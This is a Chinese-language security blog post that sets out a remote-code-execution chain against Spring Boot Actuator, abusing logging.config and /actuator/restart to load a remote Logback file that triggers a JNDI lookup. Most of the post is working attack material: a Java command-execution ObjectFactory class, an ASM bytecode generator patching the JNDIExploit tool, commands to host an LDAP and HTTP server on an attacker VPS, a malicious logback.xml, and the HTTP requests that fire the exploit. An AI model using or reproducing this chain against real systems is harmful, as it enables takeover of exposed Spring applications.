### 0x00: 前言

`spring actuator` 相关的漏洞利用链公布不少了，不过都有些条件限制。

我抽时间看了看 spring boot 的一些常见 properties 配置项，希望能发现一些触发条件没那么苛刻的漏洞利用方法，也发现了一些新的 RCE 方法（目前看也是有条件限制 &gt;\_&lt;）。

本着技术交流的目的，拿其中一个分享下，其他条件比较多的利用方法我可能会抽时间写到 [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit) 项目里。

### 0x01: 利用限制

`spring actuator` 目前主要有两个差别比较大的版本，1.x 和 2.x 版本。从路由角度看，2.x 版本的路由名一般比 1.x 版本路由名字前多了个 `/actuator` 前缀。本文涉及到的相关漏洞原理经过测试与 `spring actuator` 大版本的相关度差别不大，下文统一用 2.x 版本举例。

`spring actuator` 触发漏洞相关的内置路由，比如 `/actuator/env` 容易被误启用，但是 `/actuator/restart` 路由开启的情况比较少，

```php
spring actuator 1.x 开启 restart 需要配置:
endpoints.restart.enabled=true

spring actuator 2.x 开启 restart 需要配置:
management.endpoint.restart.enabled=true
```

这个漏洞利用方法正式一点的名称应该叫 spring actuator restart logging.config logback jndi rce，都是利用一些已知条件堆起来的，主要利用方法和 [jolokia-logback-jndi-rce](https://github.com/LandGrey/SpringBootVulExploit#0x04jolokia-logback-jndi-rce) 相差不大，所以需要的条件也基本类似。

另外顺便提一句，JNDI 注入环境在存在相关 tomcat 版本的话，可以用 `javax.el.ELProcessor` 作为 Reference Factory 来绕过高版本 JDK 的限制。

### 0x02: 漏洞原理

logging.config 配置项用来指定 Logback 组件的日志配置文件位置，通过 `/actuator/env` 配置恶意远程日志地址，如 `http://your-vps-ip/logback.xml` 后，请求 `/actuator/restart` 会触发该漏洞。

感兴趣的师傅可以把 debug 断点设置在 `logback-classic-1.2.3-sources.jar!/ch/qos/logback/classic/util/JNDIUtil.java` 文件 38 行左右的代码处

```php
Object lookup = ctx.lookup(name);
```

触发漏洞后查看调用栈。

与 [jolokia-logback-jndi-rce](https://github.com/LandGrey/SpringBootVulExploit#0x04jolokia-logback-jndi-rce) 不同的是，如果 jndi 返回的 object 没有实现 `javax.naming.spi.ObjectFactory` 接口，`restart` 触发漏洞后应用程序会直接报错退出。

其他通过 `restart` 触发的漏洞也有类似报错退出的问题，所以利用时要比较小心。

### 0x03: 漏洞利用

##### 一：准备要执行的 Java 代码

可以配合 `marshalsec` ，自己编写一个实现 `javax.naming.spi.ObjectFactory` 接口的类进行使用，比如

```php
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.naming.Context;
import javax.naming.Name;
import java.io.File;
import java.io.IOException;
import java.util.Hashtable;

public class CommandRaw extends AbstractTranslet implements javax.naming.spi.ObjectFactory{
    private static String cmd = "open -a Calculator";

    public CommandRaw() {
        String[] var1;
        if (File.separator.equals("/")) {
            var1 = new String[]{"/bin/bash", "-c", cmd};
        } else {
            var1 = new String[]{"cmd", "/C", cmd};
        }

        try {
            Runtime.getRuntime().exec(var1);
        } catch (IOException var3) {
            var3.printStackTrace();
        }

    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
        return new Object();
    }
}
```

编译好 class 后放到 web 网站根目录下。然后用 `marshalsec` 启动对应的 ldap 服务。

弱对抗环境下，也可以直接用其他师傅集成的工具，比如 [JNDIExploit](https://github.com/feihong-cs/JNDIExploit)。

为了让程序不抛错退出，需要针对性的修改用到的代码，比如修改 `JNDIExploit/src/main/java/com/feihong/ldap/template/CommandTemplate.java` 文件，让其返回的 class 字节码继承 `javax.naming.spi.ObjectFactory` 接口。

比如用下面的代码替换原来 `CommandTemplate.java` 文件中的 `generate` 方法：

```php
public void generate(){
    ClassWriter cw = new ClassWriter(0);
    FieldVisitor fv;
    MethodVisitor mv;
    AnnotationVisitor av0;

    cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", new String[]{"javax/naming/spi/ObjectFactory"});

    {
        fv = cw.visitField(ACC_PRIVATE + ACC_STATIC, "cmd", "Ljava/lang/String;", null, null);
        fv.visitEnd();
    }
    {
        mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        Label l0 = new Label();
        Label l1 = new Label();
        Label l2 = new Label();
        mv.visitTryCatchBlock(l0, l1, l2, "java/io/IOException");
        Label l3 = new Label();
        mv.visitLabel(l3);
        mv.visitLineNumber(19, l3);
        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", "<init>", "()V", false);
        Label l4 = new Label();
        mv.visitLabel(l4);
        mv.visitLineNumber(21, l4);
        mv.visitFieldInsn(GETSTATIC, "java/io/File", "separator", "Ljava/lang/String;");
        mv.visitLdcInsn("/");
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
        Label l5 = new Label();
        mv.visitJumpInsn(IFEQ, l5);
        Label l6 = new Label();
        mv.visitLabel(l6);
        mv.visitLineNumber(22, l6);
        mv.visitInsn(ICONST_3);
        mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_0);
        mv.visitLdcInsn("/bin/sh");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_1);
        mv.visitLdcInsn("-c");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_2);
        mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
        mv.visitInsn(AASTORE);
        mv.visitVarInsn(ASTORE, 1);
        Label l7 = new Label();
        mv.visitLabel(l7);
        mv.visitJumpInsn(GOTO, l0);
        mv.visitLabel(l5);
        mv.visitLineNumber(24, l5);
        mv.visitFrame(F_FULL, 1, new Object[]{className}, 0, new Object[]{});
        mv.visitInsn(ICONST_3);
        mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_0);
        mv.visitLdcInsn("cmd");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_1);
        mv.visitLdcInsn("/C");
        mv.visitInsn(AASTORE);
        mv.visitInsn(DUP);
        mv.visitInsn(ICONST_2);
        mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
        mv.visitInsn(AASTORE);
        mv.visitVarInsn(ASTORE, 1);
        mv.visitLabel(l0);
        mv.visitLineNumber(28, l0);
        mv.visitFrame(F_APPEND, 1, new Object[]{"[Ljava/lang/String;"}, 0, null);
        mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        mv.visitVarInsn(ALOAD, 1);
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(POP);
        mv.visitLabel(l1);
        mv.visitLineNumber(31, l1);
        Label l8 = new Label();
        mv.visitJumpInsn(GOTO, l8);
        mv.visitLabel(l2);
        mv.visitLineNumber(29, l2);
        mv.visitFrame(F_SAME1, 0, null, 1, new Object[]{"java/io/IOException"});
        mv.visitVarInsn(ASTORE, 2);
        Label l9 = new Label();
        mv.visitLabel(l9);
        mv.visitLineNumber(30, l9);
        mv.visitVarInsn(ALOAD, 2);
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/IOException", "printStackTrace", "()V", false);
        mv.visitLabel(l8);
        mv.visitLineNumber(33, l8);
        mv.visitFrame(F_SAME, 0, null, 0, null);
        mv.visitInsn(RETURN);
        Label l10 = new Label();
        mv.visitLabel(l10);
        mv.visitLocalVariable("var1", "[Ljava/lang/String;", null, l7, l5, 1);
        mv.visitLocalVariable("var3", "Ljava/io/IOException;", null, l9, l8, 2);
        mv.visitLocalVariable("this", "L" + className + ";", null, l3, l10, 0);
        mv.visitLocalVariable("var1", "[Ljava/lang/String;", null, l0, l10, 1);
        mv.visitMaxs(4, 3);
        mv.visitEnd();
    }
    {
        mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        mv.visitCode();
        Label l0 = new Label();
        mv.visitLabel(l0);
        mv.visitLineNumber(36, l0);
        mv.visitInsn(RETURN);
        Label l1 = new Label();
        mv.visitLabel(l1);
        mv.visitLocalVariable("this", "L" + className + ";", null, l0, l1, 0);
        mv.visitLocalVariable("var1", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
        mv.visitLocalVariable("var2", "[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 2);
        mv.visitMaxs(0, 3);
        mv.visitEnd();
    }
    {
        mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        mv.visitCode();
        Label l0 = new Label();
        mv.visitLabel(l0);
        mv.visitLineNumber(39, l0);
        mv.visitInsn(RETURN);
        Label l1 = new Label();
        mv.visitLabel(l1);
        mv.visitLocalVariable("this", "L" + className + ";", null, l0, l1, 0);
        mv.visitLocalVariable("var1", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
        mv.visitLocalVariable("var2", "Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;", null, l0, l1, 2);
        mv.visitLocalVariable("var3", "Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 3);
        mv.visitMaxs(0, 4);
        mv.visitEnd();
    }
    {
        mv = cw.visitMethod(ACC_PUBLIC, "getObjectInstance", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable;)Ljava/lang/Object;", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable<**>;)Ljava/lang/Object;", new String[]{"java/lang/Exception"});
        mv.visitCode();
        Label l0 = new Label();
        mv.visitLabel(l0);
        mv.visitLineNumber(43, l0);
        mv.visitTypeInsn(NEW, "java/lang/Object");
        mv.visitInsn(DUP);
        mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        mv.visitInsn(ARETURN);
        Label l1 = new Label();
        mv.visitLabel(l1);
        mv.visitLocalVariable("this", "L" + className + ";", null, l0, l1, 0);
        mv.visitLocalVariable("obj", "Ljava/lang/Object;", null, l0, l1, 1);
        mv.visitLocalVariable("name", "Ljavax/naming/Name;", null, l0, l1, 2);
        mv.visitLocalVariable("nameCtx", "Ljavax/naming/Context;", null, l0, l1, 3);
        mv.visitLocalVariable("environment", "Ljava/util/Hashtable;", "Ljava/util/Hashtable<**>;", l0, l1, 4);
        mv.visitMaxs(2, 5);
        mv.visitEnd();
    }
    {
        mv = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();
        Label l0 = new Label();
        mv.visitLabel(l0);
        mv.visitLineNumber(17, l0);
        mv.visitLdcInsn(cmd);
        mv.visitFieldInsn(PUTSTATIC, className, "cmd", "Ljava/lang/String;");
        mv.visitInsn(RETURN);
        mv.visitMaxs(1, 0);
        mv.visitEnd();
    }
    cw.visitEnd();

    bytes = cw.toByteArray();

}
```

编译好程序后，就可以用命令开启 ldap 服务：

```php
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
```

##### 二：托管 xml 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器

```php
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以 `xml` 结尾的文件，比如 `logback.xml`，示例如下：

```php
<configuration>
  <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y" as="appName" />
</configuration>
```

##### 三：触发漏洞

```php
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name": "logging.config", "value": "http://your-vps-ip/logback.xml"}
POST /actuator/restart HTTP/1.1
Content-Type: application/json
Content-Length: 0
```

文章首发在自己博客，原文地址为：<https://landgrey.me/blog/21/>